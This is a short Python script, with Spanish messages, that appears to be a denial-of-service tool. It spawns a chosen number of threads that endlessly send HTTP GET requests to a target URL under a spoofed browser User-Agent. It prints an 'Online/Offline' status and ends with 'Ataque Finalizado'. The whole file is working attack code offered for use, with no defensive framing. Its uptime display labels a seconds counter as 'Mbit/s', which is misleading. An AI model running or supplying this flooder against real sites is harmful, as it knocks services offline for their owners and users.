# !/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import sys
import requests
import time

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}

if len(sys.argv) >= 3:

   url = sys.argv[1]
   hilos = int(sys.argv[2])
   activo = 1
   estado = '+'
   seg = 0

   def conectar():
      global url
      global activo
      global estado

      while activo:
         if activo == 0:
            sys.exit()
            raise
            break
         else:
            try:
               requests.get(url,timeout=8,headers=headers)
               estado = '+'
            except KeyboardInterrupt:
               activo = 0
               sys.exit()
            except:
               estado = '-'

   def principal():
      global hilos

      threads = list()
      for i in range(hilos):
         conexion = threading.Thread(target=conectar)
         threads.append(conexion)
         conexion.start()

   print("[Creating threads] \n") 

   principal()
   while activo:
      seg = seg + 1
      try:
         if (estado == '+'):
          print(" [Uptime] Online - " + str(seg) + " Mbit/s"),
         else:
          print(" [Uptime] Offline - " + str(seg) + " Mbit/s"), 
         time.sleep(1)
         sys.stdout.flush()
         print ("\r"),
      except KeyboardInterrupt:
         activo = 0
         print ('\n\n[Ataque Finalizado]')
         sys.exit()
      except:
         seg = seg + 1
else:
    print("Use 'python main.py \"http://<url>\" <threads>'")